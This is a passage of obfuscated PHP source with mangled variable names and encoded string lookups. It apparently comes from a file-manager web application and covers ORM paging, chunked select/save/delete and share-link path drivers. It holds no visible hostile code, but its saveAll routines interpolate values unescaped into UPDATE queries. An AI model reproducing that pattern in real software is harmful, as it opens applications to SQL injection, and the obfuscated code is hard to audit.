($º¯ü¾ñ === -1) { $in[$˜ÓÀ‰×ª[370]] = !1; $Ÿã³Ì“² = 100000000; $º¯ü¾ñ = $Ÿã³Ì“²; } $Øñ¨ß§Ş = $šÁÃáñ; $Øñ¨ß§Ş[$˜ÓÀ‰×ª[372]] = array(); $º¯ü¾ñ = intval($º¯ü¾ñ); $º¯ü¾ñ = $º¯ü¾ñ <= 5 ? 5 : ($º¯ü¾ñ >= $Ÿã³Ì“² ? $Ÿã³Ì“² : $º¯ü¾ñ); $ôú‚åİÑ = intval(isset($in[$˜ÓÀ‰×ª[360]]) && $in[$˜ÓÀ‰×ª[360]] ? $in[$˜ÓÀ‰×ª[360]] : $ôú‚åİÑ); $ôú‚åİÑ = $ôú‚åİÑ <= 1 ? 1 : $ôú‚åİÑ; $¿Ùá®“ê = array(); $³¸òë = 1; if ($ôú‚åİÑ == 1 && $³¸òë) { $this->optionsValue($šÁÃáñ); $¿Ùá®“ê = $this->page($ôú‚åİÑ, $º¯ü¾ñ)->select(); $Ë²ËŸà = is_array($¿Ùá®“ê) ? count($¿Ùá®“ê) : 0; if ($Ë²ËŸà < $º¯ü¾ñ) { $ıà±ëû = 1; } else { $this->optionsValue($Øñ¨ß§Ş); $Ë²ËŸà = intval($this->count()); $ıà±ëû = ceil($Ë²ËŸà / $º¯ü¾ñ); } } else { $this->optionsValue($Øñ¨ß§Ş); $Ë²ËŸà = intval($this->count()); $ıà±ëû = ceil($Ë²ËŸà / $º¯ü¾ñ); $ôú‚åİÑ = $ôú‚åİÑ >= $ıà±ëû ? $ıà±ëû : $ôú‚åİÑ; $this->optionsValue($šÁÃáñ); $¿Ùá®“ê = $this->page($ôú‚åİÑ, $º¯ü¾ñ)->select(); } if (!is_array($¿Ùá®“ê)) { $¿Ùá®“ê = array(); } if ($ıà±ëû == 1) { $Ë²ËŸà = count($¿Ùá®“ê); } $§¤·ÎÄ = array($˜ÓÀ‰×ª[373] => array($˜ÓÀ‰×ª[374] => $Ë²ËŸà, $˜ÓÀ‰×ª[370] => $º¯ü¾ñ, $˜ÓÀ‰×ª[360] => $ôú‚åİÑ, $˜ÓÀ‰×ª[375] => $ıà±ëû), $˜ÓÀ‰×ª[376] => $¿Ùá®“ê); return $§¤·ÎÄ; } protected function checkLength($æÊßü…Ã, $¶Î¡«¡Ğ = 0, $Ö®ıì®Ğ = '') { $‰”ĞÁèç =& $_SERVER[Á÷ ­Šë]; $¶Î¡«¡Ğ = $¶Î¡«¡Ğ ? $¶Î¡«¡Ğ : 65536; if (!$æÊßü…Ã || strlen($æÊßü…Ã) < $¶Î¡«¡Ğ) { return; } $Ö®ıì®Ğ = $Ö®ıì®Ğ ? $Ö®ıì®Ğ . $‰”ĞÁèç[78] : $‰”ĞÁèç[33]; show_json($Ö®ıì®Ğ . LNG($‰”ĞÁèç[377]) . "\50{$¶Î¡«¡Ğ}\x29", !1); } protected function metaSet($¾¥©’áê, $ÖÒ¦©•Ä = null, $ªÒ°æ = null) { $•²»ÄÑÉ =& $_SERVER[Á÷ ­Šë]; if (!$this->tableMeta || !$¾¥©’áê) { return !1; } $æËŸó¸º = $this->tableMeta[$•²»ÄÑÉ[378]]; $ØÄ¢¥ƒ = $this->tableMeta[$•²»ÄÑÉ[379]]; $øœÕ…†° = Model($ØÄ¢¥ƒ); $´£Ò´ØĞ = array($æËŸó¸º => $¾¥©’áê, $•²»ÄÑÉ[380] => $ÖÒ¦©•Ä); if (is_null($ÖÒ¦©•Ä)) { return $øœÕ…†°->where(array($æËŸó¸º => $¾¥©’áê))->delete(); } if (is_null($ªÒ°æ) && is_string($ÖÒ¦©•Ä)) { return $øœÕ…†°->where($´£Ò´ØĞ)->delete(); } $Â´éÆˆ = is_array($ÖÒ¦©•Ä) ? $ÖÒ¦©•Ä : array(); if (is_string($ÖÒ¦©•Ä)) { $Â´éÆˆ[$ÖÒ¦©•Ä] = $ªÒ°æ; } $Ïéî¯Ö = array(); foreach ($Â´éÆˆ as $óûÈ¬¬ª => $‘ÒÓ½ƒ) { if (is_null($‘ÒÓ½ƒ) && is_string($óûÈ¬¬ª)) { $øœÕ…†°->where(array($æËŸó¸º => $¾¥©’áê, $•²»ÄÑÉ[380] => $óûÈ¬¬ª))->delete(); continue; } $this->checkLength($‘ÒÓ½ƒ, !1, $ØÄ¢¥ƒ . $•²»ÄÑÉ[4] . $óûÈ¬¬ª); $Ïéî¯Ö[] = array($æËŸó¸º => $¾¥©’áê, $•²»ÄÑÉ[103] => $óûÈ¬¬ª, $•²»ÄÑÉ[381] => $‘ÒÓ½ƒ); } $Ò¿Šãğ¶ = $•²»ÄÑÉ[382] . $ØÄ¢¥ƒ; CacheLock::lock($Ò¿Šãğ¶); $øœÕ…†°->where(array($æËŸó¸º => $¾¥©’áê))->addAll($Ïéî¯Ö, array(), !0); CacheLock::unlock($Ò¿Šãğ¶); return !0; } public function metaGet($ß±ÏöØª, $êµÎä‚ = false) { $¨ûÑŞÈÒ =& $_SERVER[Á÷ ­Šë]; if (!$this->tableMeta) { return array(); } $Ì‘¶Œï­ = $this->tableMeta[$¨ûÑŞÈÒ[378]]; $ıûÖíºÆ = Model($this->tableMeta[$¨ûÑŞÈÒ[379]]); if ($êµÎä‚) { $£ÑÊ—Œœ = array($Ì‘¶Œï­ => $ß±ÏöØª, $¨ûÑŞÈÒ[103] => $êµÎä‚); return $ıûÖíºÆ->where($£ÑÊ—Œœ)->getField($¨ûÑŞÈÒ[381]); } $£ÑÊ—Œœ = array($Ì‘¶Œï­ => $ß±ÏöØª); $Ù¯Ò‚ãù = $ıûÖíºÆ->field($¨ûÑŞÈÒ[383])->where($£ÑÊ—Œœ)->select(); $Ù¯Ò‚ãù = array_to_keyvalue($Ù¯Ò‚ãù, $¨ûÑŞÈÒ[103], $¨ûÑŞÈÒ[381]); return $Ù¯Ò‚ãù; } private function checkDataAutoHas($ó…¤õÌó) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $“å…ĞÒ) { if (in_array($ó…¤õÌó, explode($_SERVER[Á÷ ­Šë][47], $“å…ĞÒ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$«İüßù¬, $À±¶ÂÚÛ) { $‹ÑúÃ±Ÿ =& $_SERVER[Á÷ ­Šë]; foreach ($this->dataAuto as $Æ ³Î) { $Øı™µş = $Æ ³Î[0]; if (!in_array($À±¶ÂÚÛ, explode($‹ÑúÃ±Ÿ[47], $Æ ³Î[2]))) { continue; } switch (trim($Æ ³Î[3])) { case $‹ÑúÃ±Ÿ[328]: case $‹ÑúÃ±Ÿ[329]: $Ûù×Õ ü = $Æ ³Î[1]; $á›çüòÜ = isset($Æ ³Î[4]) ? (array) $Æ ³Î[4] : array(); if ($Ûù×Õ ü == $‹ÑúÃ±Ÿ[207] && array_key_exists($Øı™µş, $«İüßù¬)) { if (!$«İüßù¬[$Øı™µş]) { unset($«İüßù¬[$Øı™µş]); } break; } if (isset($«İüßù¬[$Øı™µş])) { array_unshift($á›çüòÜ, $«İüßù¬[$Øı™µş]); } if ($‹ÑúÃ±Ÿ[328] == $Æ ³Î[3]) { $«İüßù¬[$Øı™µş] = call_user_func_array($Ûù×Õ ü, $á›çüòÜ); } else { $«İüßù¬[$Øı™µş] = call_user_func_array(array(&$this, $Ûù×Õ ü), $á›çüòÜ); } break; case $‹ÑúÃ±Ÿ[277]: if (isset($«İüßù¬[$Øı™µş]) && $«İüßù¬[$Øı™µş]) { $«İüßù¬[$Øı™µş] = call_user_func_array(array(&$this, $Æ ³Î[1]), array($«İüßù¬[$Øı™µş])); } break; case $‹ÑúÃ±Ÿ[280]: $«İüßù¬[$Øı™µş] = $«İüßù¬[$Æ ³Î[1]]; break; case $‹ÑúÃ±Ÿ[301]: if (isset($«İüßù¬[$Øı™µş]) && !is_string($«İüßù¬[$Øı™µş])) { $«İüßù¬[$Øı™µş] = json_encode_force($«İüßù¬[$Øı™µş]); } break; case $‹ÑúÃ±Ÿ[330]: if ($«İüßù¬[$Øı™µş] === $‹ÑúÃ±Ÿ[33]) { unset($«İüßù¬[$Øı™µş]); } break; case $‹ÑúÃ±Ÿ[331]: $«İüßù¬[$Øı™µş] = $Æ ³Î[1]; default: break; } } if ($À±¶ÂÚÛ == $‹ÑúÃ±Ÿ[362]) { $…‰æŒÈĞ = strtolower($this->db->getDbType()); if (strpos($…‰æŒÈĞ, $‹ÑúÃ±Ÿ[9]) !== 0) { return; } $àìá™ëø = $this->field(!0)->fields; $Áş¾÷üø = $àìá™ëø[$‹ÑúÃ±Ÿ[259]]; if (isset($àìá™ëø[$‹ÑúÃ±Ÿ[258]])) { unset($Áş¾÷üø[$àìá™ëø[$‹ÑúÃ±Ÿ[258]]]); } foreach ($Áş¾÷üø as $ÎÆŸÈ÷Ã => $À±¶ÂÚÛ) { if (!isset($«İüßù¬[$ÎÆŸÈ÷Ã])) { $«İüßù¬[$ÎÆŸÈ÷Ã] = $‹ÑúÃ±Ÿ[33]; } } } } private function dataAfterFilter(&$ÕŒ¶ü’‚) { $“µˆ¿ç‘ =& $_SERVER[Á÷ ­Šë]; foreach ($this->dataAuto as $îÇ»¯è£) { $‚²Ã†µ’ = $îÇ»¯è£[0]; if (!isset($ÕŒ¶ü’‚[$‚²Ã†µ’])) { continue; } if (!in_array($“µˆ¿ç‘[364], explode($“µˆ¿ç‘[47], $îÇ»¯è£[2]))) { continue; } switch (trim($îÇ»¯è£[3])) { case $“µˆ¿ç‘[328]: case $“µˆ¿ç‘[329]: $Ÿ“½Ô° = isset($îÇ»¯è£[4]) ? (array) $îÇ»¯è£[4] : array(); array_unshift($Ÿ“½Ô°, $ÕŒ¶ü’‚[$‚²Ã†µ’]); if (isset($îÇ»¯è£[4]) && $îÇ»¯è£[4] == $“µˆ¿ç‘[384]) { $Ÿ“½Ô° = array($ÕŒ¶ü’‚[$‚²Ã†µ’]); } if ($“µˆ¿ç‘[328] == $îÇ»¯è£[3]) { $ÕŒ¶ü’‚[$‚²Ã†µ’] = call_user_func_array($îÇ»¯è£[1], $Ÿ“½Ô°); } else { $ÕŒ¶ü’‚[$‚²Ã†µ’] = call_user_func_array(array(&$this, $îÇ»¯è£[1]), $Ÿ“½Ô°); } break; case $“µˆ¿ç‘[277]: if (isset($ÕŒ¶ü’‚[$‚²Ã†µ’]) && $ÕŒ¶ü’‚[$‚²Ã†µ’]) { $ÕŒ¶ü’‚[$‚²Ã†µ’] = call_user_func_array(array(&$this, $îÇ»¯è£[1]), array($ÕŒ¶ü’‚[$‚²Ã†µ’])); } break; case $“µˆ¿ç‘[280]: $ÕŒ¶ü’‚[$‚²Ã†µ’] = $ÕŒ¶ü’‚[$îÇ»¯è£[1]]; break; case $“µˆ¿ç‘[301]: $«ÖğÍğì = $ÕŒ¶ü’‚[$‚²Ã†µ’]; $ÕŒ¶ü’‚[$‚²Ã†µ’] = json_decode($«ÖğÍğì, !0); if (is_null($ÕŒ¶ü’‚[$‚²Ã†µ’])) { $ÕŒ¶ü’‚[$‚²Ã†µ’] = $«ÖğÍğì; } break; case $“µˆ¿ç‘[330]: if ($ÕŒ¶ü’‚[$‚²Ã†µ’] === $“µˆ¿ç‘[33]) { unset($ÕŒ¶ü’‚[$‚²Ã†µ’]); } break; case $“µˆ¿ç‘[331]: $ÕŒ¶ü’‚[$‚²Ã†µ’] = $îÇ»¯è£[1]; break; default: break; } } } public function saveAll($¬œÇß†â) { $×è”»­š =& $_SERVER[Á÷ ­Šë]; $ş£æŠí³ = $this->tablePrefix . $this->tableName; $ö”›°Ğ = self::SQL_WHERE_IN_CHUNK; $¬œÇß†â = is_array($¬œÇß†â) ? $¬œÇß†â : array(); $ÂŠÎãï = $×è”»­š[385]; $ï³ÔÂå´ = 0; $¿¾ÜÛî = array(); $‡ã£§Ç = count($¬œÇß†â); for ($‚Ó•¨Á‚ = 0; $‚Ó•¨Á‚ < $‡ã£§Ç; $‚Ó•¨Á‚++) { $¦£àÖáØ = $¬œÇß†â[$‚Ó•¨Á‚]; if (!is_array($¦£àÖáØ) || count($¦£àÖáØ) != 4) { continue; } $©ÎœÉÙı = "\x55\x50\104\101\x54\x45\x20\140{$ş£æŠí³}\140\x20\x53\105\x54\x20{$¦£àÖáØ[2]}\40\75\x20\103\101\x53\105\x20{$¦£àÖáØ[0]}\40\12"; if ($ï³ÔÂå´ == 0) { $ÂŠÎãï = $©ÎœÉÙı; } $¿¾ÜÛî[] = $×è”»­š[126] . $¦£àÖáØ[1] . $×è”»­š[126]; $ï³ÔÂå´++; $ÂŠÎãï .= "\x20\x57\110\105\x4e\x20\x27{$¦£àÖáØ[1]}\x27\x20\124\x48\x45\x4e\40\47{$¦£àÖáØ[3]}\47\40\xa"; if ($ï³ÔÂå´ == $ö”›°Ğ || $‚Ó•¨Á‚ == $‡ã£§Ç - 1) { $ØôÅİÃÆ = implode($×è”»­š[47], $¿¾ÜÛî); $ÂŠÎãï .= "\x20\x45\x4e\104\x20\40\127\110\105\122\105\40{$¦£àÖáØ[0]}\x20\x49\116\x20\50{$ØôÅİÃÆ}\x29\x20"; $this->execute($ÂŠÎãï); $ï³ÔÂå´ = 0; $ÂŠÎãï = $©ÎœÉÙı; $this->chunkEventCheck(count($¿¾ÜÛî)); $¿¾ÜÛî = array(); } } $this->chunkEventSet(); } public function saveAllEach($ªëã¹‚‚) { $Š€‚²×û =& $_SERVER[Á÷ ­Šë]; $âÒß÷¦­ = $this->tablePrefix . $this->tableName; foreach ($ªëã¹‚‚ as $±Œé¨£ƒ) { if (!is_array($±Œé¨£ƒ) || count($±Œé¨£ƒ) != 4) { continue; } $È¤Õá Ø = $±Œé¨£ƒ[0] . $Š€‚²×û[386] . $±Œé¨£ƒ[1] . $Š€‚²×û[126]; $â‚Éı® = $±Œé¨£ƒ[2] . $Š€‚²×û[386] . $±Œé¨£ƒ[3] . $Š€‚²×û[126]; $¦úİ¥ÍÅ = "\165\x70\144\141\164\x65\x20{$âÒß÷¦­}\40\163\145\164\40{$â‚Éı®}\x20\x77\150\145\162\x65\x20{$È¤Õá Ø}\x3b"; $this->execute($¦úİ¥ÍÅ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($™ªÔ˜ƒÕ = false, $Ïå¤°ìŠ = false) { $this->_chunkEvent = $™ªÔ˜ƒÕ; $this->_chunkEventParam = $Ïå¤°ìŠ; } private function chunkEventCheck($éçë…Éù) { if (!$this->_chunkEvent) { return; } $ç¿£€ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ç¿£€[$_SERVER[Á÷ ­Šë][387]] = $éçë…Éù; Hook::trigger($this->_chunkEvent, $ç¿£€); } public function addAll($óÁâ¯á¹, $ıà¦ú’ë = array(), $‡¯İ¤ƒ’ = false) { $ƒƒâçæ“ =& $_SERVER[Á÷ ­Šë]; ignore_timeout(); $«¨‰Å¤¢ = self::SQL_WHERE_IN_CHUNK; if (empty($óÁâ¯á¹)) { $this->error = think_lang($ƒƒâçæ“[278]); return !1; } $ıà¦ú’ë = $this->_parseOptions($ıà¦ú’ë); foreach ($óÁâ¯á¹ as $‘©öŠ¯ => $¶ê—¢’«) { $óÁâ¯á¹[$‘©öŠ¯] = $this->_facade($¶ê—¢’«); $this->_beforeInsert($óÁâ¯á¹[$‘©öŠ¯], $ıà¦ú’ë); } if (method_exists($this->db, $ƒƒâçæ“[279])) { for ($°¬‡¢‘Í = 0; $°¬‡¢‘Í < count($óÁâ¯á¹); $°¬‡¢‘Í += $«¨‰Å¤¢) { $ÆÕ–›Š = array_slice($óÁâ¯á¹, $°¬‡¢‘Í, $«¨‰Å¤¢); if (!is_array($ÆÕ–›Š) || count($ÆÕ–›Š) == 0) { break; } $¶¤„™áú = $this->db->insertAll($ÆÕ–›Š, $ıà¦ú’ë, $‡¯İ¤ƒ’); $this->chunkEventCheck(count($ÆÕ–›Š)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($óÁâ¯á¹ as $‘©öŠ¯ => $¶ê—¢’«) { $¶¤„™áú = $this->db->insert($¶ê—¢’«, $ıà¦ú’ë, $‡¯İ¤ƒ’); } $this->commit(); } if (!1 !== $¶¤„™áú) { $³Âè­‰„ = $this->getLastInsID(); if ($³Âè­‰„) { return $³Âè­‰„; } } return $¶¤„™áú; } public function save($ß‡©¢ÂÃ = '', $Ã“÷…š = array()) { $‹Ôıóõ­ =& $_SERVER[Á÷ ­Šë]; $â‚…„ø = self::SQL_WHERE_IN_CHUNK; $¥ŒÀå¿É = $this->optionsValue(); $ÛïÕÁ = $this->findWhereField($¥ŒÀå¿É); if (!$ÛïÕÁ) { return parent::save($ß‡©¢ÂÃ, $Ã“÷…š); } $˜•øù¯¾ = 0; $¬Á–ß­Ã = $¥ŒÀå¿É[$‹Ôıóõ­[282]][$ÛïÕÁ][1]; $¬Á–ß­Ã = is_array($¬Á–ß­Ã) ? $¬Á–ß­Ã : array(); $À‹À»Ñ¹ = count($¬Á–ß­Ã); for ($½¨¯ş–Ï = 0; $½¨¯ş–Ï < $À‹À»Ñ¹; $½¨¯ş–Ï += $â‚…„ø) { $ƒ•±˜‘ö = array_slice($¬Á–ß­Ã, $½¨¯ş–Ï, $â‚…„ø); if (!is_array($ƒ•±˜‘ö) || count($ƒ•±˜‘ö) == 0) { break; } $¥ŒÀå¿É[$‹Ôıóõ­[282]][$ÛïÕÁ][1] = $ƒ•±˜‘ö; $this->optionsValue($¥ŒÀå¿É); $˜•øù¯¾ += parent::save($ß‡©¢ÂÃ, $Ã“÷…š); $this->chunkEventCheck(count($ƒ•±˜‘ö)); } $this->chunkEventSet(); return $˜•øù¯¾; } public function add($‡à’ŞŸ = '', $‡È‚‰ò§ = array(), $…ĞÑÕûê = false) { if ($this->addTaskStatus && is_array($‡à’ŞŸ)) { $this->addTaskData[] = $‡à’ŞŸ; return; } return parent::add($‡à’ŞŸ, $‡È‚‰ò§, $…ĞÑÕûê); } public function parseWhereLike($¦µñú“Å, $‘ Ëğãî = '', $Íí®· = false, &$óÉ‡ÀµŠ = false) { $è÷ôÌµ =& $_SERVER[Á÷ ­Šë]; $Ğõ¥Ï¶² = $GLOBALS[$è÷ôÌµ[6]][$è÷ôÌµ[388]]; if (!$Ğõ¥Ï¶²[$è÷ôÌµ[389]]) { return $¦µñú“Å; } if (!is_array($¦µñú“Å)) { return $¦µñú“Å; } $ã¬ş²èà = array(); $¯®½óİĞ = 0; foreach ($¦µñú“Å as $’ëšŸÍ› => $éÍ ß¯) { if (is_array($éÍ ß¯) && count($éÍ ß¯) == 2 && $éÍ ß¯[0] == $è÷ôÌµ[390] && is_string($éÍ ß¯[1]) && substr($éÍ ß¯[1], 0, 1) == $è÷ôÌµ[391] && substr($éÍ ß¯[1], strlen($éÍ ß¯[1]) - 1, 1) == $è÷ôÌµ[391]) { $óÉ‡ÀµŠ = !0; $öÇüÆ€´ = is_string($’ëšŸÍ›) ? $’ëšŸÍ› : $‘ Ëğãî; $Ê‡àİƒ¡ = substr($éÍ ß¯[1], 1, strlen($éÍ ß¯[1]) - 2); $Ê‡àİƒ¡ = $this->db->escapeString($Ê‡àİƒ¡); if (!strpos($öÇüÆ€´, $è÷ôÌµ[105])) { $öÇüÆ€´ = $è÷ôÌµ[392] . $öÇüÆ€´ . $è÷ôÌµ[392]; } $æø–¼«Ğ = $è÷ôÌµ[192] . $Ê‡àİƒ¡ . $è÷ôÌµ[192]; if ($Ğõ¥Ï¶²[$è÷ôÌµ[393]]) { $æø–¼«Ğ = $è÷ôÌµ[394] . $Ê‡àİƒ¡ . $è÷ôÌµ[395]; if ($Ğõ¥Ï¶²[$è÷ôÌµ[396]]) { $æø–¼«Ğ = $è÷ôÌµ[395] . $Ê‡àİƒ¡ . $è÷ôÌµ[394]; } } $ã¬ş²èà[$¯®½óİĞ] = $è÷ôÌµ[397] . $öÇüÆ€´ . $è÷ôÌµ[398] . $æø–¼«Ğ . $è÷ôÌµ[399]; $¯®½óİĞ++; continue; } if (is_array($éÍ ß¯)) { $‘ Ëğãî = is_string($’ëšŸÍ›) ? $’ëšŸÍ› : $‘ Ëğãî; $éÍ ß¯ = $this->parseWhereLike($éÍ ß¯, $‘ Ëğãî, !0, $óÉ‡ÀµŠ); } if (is_numeric($’ëšŸÍ›)) { $ã¬ş²èà[$¯®½óİĞ] = $éÍ ß¯; $¯®½óİĞ++; } else { $ã¬ş²èà[$’ëšŸÍ›] = $éÍ ß¯; } } if ($óÉ‡ÀµŠ && !$Íí®·) { } return $ã¬ş²èà; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($£”ä†‰‚ = array()) { $‹¬ÛÜ° =& $_SERVER[Á÷ ­Šë]; $‚Ä•ö¨ß = self::SQL_WHERE_IN_CHUNK; $¬“ÂÕ˜Ò = $this->optionsValue(); $¯Î–êò = $this->findWhereField($¬“ÂÕ˜Ò); if (!$¯Î–êò || isset($¬“ÂÕ˜Ò[$‹¬ÛÜ°[299]]) || isset($¬“ÂÕ˜Ò[$‹¬ÛÜ°[360]])) { return parent::select($£”ä†‰‚); } $¯»ëíúñ = $¬“ÂÕ˜Ò[$‹¬ÛÜ°[282]][$¯Î–êò][1]; $¯»ëíúñ = is_array($¯»ëíúñ) ? $¯»ëíúñ : array(); $îëªŞ»ì = null; for ($ñ¾¼ˆèå = 0; $ñ¾¼ˆèå < count($¯»ëíúñ); $ñ¾¼ˆèå += $‚Ä•ö¨ß) { $õ‡‚– = array_slice($¯»ëíúñ, $ñ¾¼ˆèå, $‚Ä•ö¨ß); if (!is_array($õ‡‚–) || count($õ‡‚–) == 0) { break; } $¬“ÂÕ˜Ò[$‹¬ÛÜ°[282]][$¯Î–êò][1] = $õ‡‚–; $this->optionsValue($¬“ÂÕ˜Ò); $áú¸ø¤¯ = parent::select($£”ä†‰‚); if (!$áú¸ø¤¯) { continue; } $îëªŞ»ì = is_array($îëªŞ»ì) ? $îëªŞ»ì : array(); $îëªŞ»ì = array_merge($îëªŞ»ì, $áú¸ø¤¯); } return $îëªŞ»ì; } public function delete($ãŞƒó‡Ô = array()) { $—©½üêª =& $_SERVER[Á÷ ­Šë]; $Ã§äÍµ = self::SQL_WHERE_IN_CHUNK; $¬É§ò¢½ = $this->optionsValue(); $„¯€ñ¼ü = $this->findWhereField($¬É§ò¢½); if (!$„¯€ñ¼ü) { return parent::delete($ãŞƒó‡Ô); } $àĞ¨´ü— = 0; $¯¦•Ä„É = $¬É§ò¢½[$—©½üêª[282]][$„¯€ñ¼ü][1]; $¯¦•Ä„É = is_array($¯¦•Ä„É) ? $¯¦•Ä„É : array(); for ($×ÔĞ·­ä = 0; $×ÔĞ·­ä < count($¯¦•Ä„É); $×ÔĞ·­ä += $Ã§äÍµ) { $úˆ±ñİ± = array_slice($¯¦•Ä„É, $×ÔĞ·­ä, $Ã§äÍµ); if (!is_array($úˆ±ñİ±) || count($úˆ±ñİ±) == 0) { break; } $¬É§ò¢½[$—©½üêª[282]][$„¯€ñ¼ü][1] = $úˆ±ñİ±; $this->optionsValue($¬É§ò¢½); $àĞ¨´ü— += parent::delete($ãŞƒó‡Ô); } return $àĞ¨´ü—; } private function findWhereField($íø»…Ÿµ) { $û»âÚ®£ =& $_SERVER[Á÷ ­Šë]; $±ÔÆè§” = self::SQL_WHERE_IN_CHUNK; if (!is_array($íø»…Ÿµ) || !is_array($íø»…Ÿµ[$û»âÚ®£[282]])) { return !1; } foreach ($íø»…Ÿµ[$û»âÚ®£[282]] as $íëÛÆú => $Ùß÷È¡§) { if (is_array($Ùß÷È¡§) && isset($Ùß÷È¡§[0]) && is_string($Ùß÷È¡§[0]) && strtolower($Ùß÷È¡§[0]) == $û»âÚ®£[7] && is_array($Ùß÷È¡§[1]) && count($Ùß÷È¡§[1]) > $±ÔÆè§”) { ignore_timeout(); return $íëÛÆú; } } return !1; } public function setMasterDB($İù³„¡§ = true) { think_config($_SERVER[Á÷ ­Šë][400], $İù³„¡§); } } goto c®„æ¾¶ÒŠ; a««‡±‹×à: class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÑğˆÖ™) { $this->pathParse = $ÑğˆÖ™; $this->model = Model($_SERVER[Á÷ ­Šë][1249]); } protected function infoParse($¬÷ûõÖŒ, $³ÕË›’ = false, $Òé½ãšÂ = false) { $¡ŞÔšûù =& $_SERVER[Á÷ ­Šë]; return Action($¡ŞÔšûù[1101])->sharePathInfo($this->pathParse[$¡ŞÔšûù[86]], !0); } public function listPath($ĞŒÓ±ôª, $ëŒ†µÚÆ = false) { $ôƒıÂØ€ =& $_SERVER[Á÷ ­Šë]; $ÀÑşş¸ı = parent::listPath($ĞŒÓ±ôª, $ëŒ†µÚÆ); if (!$ÀÑşş¸ı) { return $ÀÑşş¸ı; } if (is_array($ÀÑşş¸ı[$ôƒıÂØ€[1258]])) { $ÀÑşş¸ı[$ôƒıÂØ€[1258]] = Action($ôƒıÂØ€[1101])->shareItemInfo($ÀÑşş¸ı[$ôƒıÂØ€[1258]]); } foreach ($ÀÑşş¸ı as $¼óÅ¤ => $¹Ñ‹ìŞï) { if (!in_array($¼óÅ¤, array($ôƒıÂØ€[84], $ôƒıÂØ€[85]))) { continue; } foreach ($¹Ñ‹ìŞï as $·–¬¥™ => $Òåéå˜ı) { $ÀÑşş¸ı[$¼óÅ¤][$·–¬¥™] = Action($ôƒıÂØ€[1101])->shareItemInfo($Òåéå˜ı); } } return $ÀÑşş¸ı; } public function listAll($ğø³Ÿ…â) { $›Öï“×Ë =& $_SERVER[Á÷ ­Šë]; $¿©–´Ëö = IO::info($this->pathParse[$›Öï“×Ë[86]]); if (!$¿©–´Ëö) { return array(); } $¦ûˆ·š™ = $this->model->listAll($ğø³Ÿ…â); foreach ($¦ûˆ·š™ as &$’¥ÜÃıÛ) { $’¥ÜÃıÛ[$›Öï“×Ë[95]] = Action($›Öï“×Ë[1101])->shareItemInfo($’¥ÜÃıÛ[$›Öï“×Ë[95]]); } unset($’¥ÜÃıÛ); return $¦ûˆ·š™; } } class PathDriverDriverShareItem { public function __construct($åş™¦ï¤) { $this->pathParse = $åş™¦ï¤; } public function __call($¿ìÎÖéÊ, $‚±…™ Ç) { $´½µºĞ =& $_SERVER[Á÷ ­Šë]; if (method_exists($this, $¿ìÎÖéÊ)) { return; } $ÖËß ’€ = call_user_func_array(array($´½µºĞ[1259], $¿ìÎÖéÊ), $‚±…™ Ç); $Å†Óõø® = array($´½µºĞ[1260], $´½µºĞ[1261], $´½µºĞ[1262], $´½µºĞ[1263], $´½µºĞ[553], $´½µºĞ[555], $´½µºĞ[1264], $´½µºĞ[117], $´½µºĞ[1265], $´½µºĞ[1266]); if (in_array($¿ìÎÖéÊ, $Å†Óõø®)) { $ÖËß ’€ = $this->getPathOuter($ÖËß ’€); } return $ÖËß ’€; } public function copy($ŠŠ¥à×Ë, $ßß¨°œÏ, $´¯Ö”Çå = false, $Í­šÎÂ = false) { return $this->copyMove($ŠŠ¥à×Ë, $ßß¨°œÏ, $´¯Ö”Çå, $_SERVER[Á÷ ­Šë][553], $Í­šÎÂ); } public function move($³¶¤ÆÄÊ, $¥Ôı”‘Ô, $Ï‘£İÒ = false, $ñô¹Ü„ = false) { return $this->copyMove($³¶¤ÆÄÊ, $¥Ôı”‘Ô, $Ï‘£İÒ, $_SERVER[Á÷ ­Šë][555], $ñô¹Ü„); } private function copyMove($ñ£¾ÑÜ€, $Ò£˜Ùö†, $«ˆóïã, $ß™Ëıú , $‡š½Õµ¯ = false) { $–«§»™ş =& $_SERVER[Á÷ ­Šë]; $•™šä£¿ = $Ò£˜Ùö†; $›ğ÷¯İª = IO::driverMake($Ò£˜Ùö†); if ($›ğ÷¯İª->pathParse[$–«§»™ş[1079]]) { $Ò£˜Ùö† = $›ğ÷¯İª->pathParse[$–«§»™ş[1079]]; } else { $Ò£˜Ùö† = $•™šä£¿; } $ßçüŠ‘ = IO::copyMove($ñ£¾ÑÜ€, $Ò£˜Ùö†, $«ˆóïã, $ß™Ëıú , $‡š½Õµ¯); $ßçüŠ‘ = $this->getPathOuter($ßçüŠ‘); return $ßçüŠ‘; } public function pathThis($˜äíƒç) { return get_path_this($this->pathParse[$_SERVER[Á÷ ­Šë][86]]); } public function pathFather($™‹Çİ‚Ö) { return get_path_father($this->pathParse[$_SERVER[Á÷ ­Šë][86]]); } public function iconvSystem($Œñ×àüÛ) { return $Œñ×àüÛ; } protected function infoParse($•¥½¡¤Í, $Íàû÷û = false) { $éóÑ‘—ü =& $_SERVER[Á÷ ­Šë]; $ãšİÒÓç = $this->pathParse[$éóÑ‘—ü[490]][$éóÑ‘—ü[1102]] . $this->pathParse[$éóÑ‘—ü[1095]]; if ($Íàû÷û) { $³øûãç— = IO::infoWithChildren($ãšİÒÓç); } else { $³øûãç— = IO::info($ãšİÒÓç); } $¶ÙéìüĞ = $this->pathParse[$éóÑ‘—ü[490]]; return Action($éóÑ‘—ü[1257])->_shareItemeParse($³øûãç—, $¶ÙéìüĞ); } public function listAll($Şòùºñ£) { $„ª™— =& $_SERVER[Á÷ ­Šë]; $Ã£‚œÉ = IO::listAll($Şòùºñ£); $—¬ Ÿï° = $this->pathParse[$„ª™—[490]]; foreach ($Ã£‚œÉ as &$ÒÁ‡êóÎ) { check_abort(); $ëŞİ¢¥¤ = IO::info($ÒÁ‡êóÎ[$„ª™—[86]]); $ëŞİ¢¥¤ = is_array($ëŞİ¢¥¤) ? $ëŞİ¢¥¤ : array(); $ÒÁ‡êóÎ = array_merge($ëŞİ¢¥¤, $ÒÁ‡êóÎ); 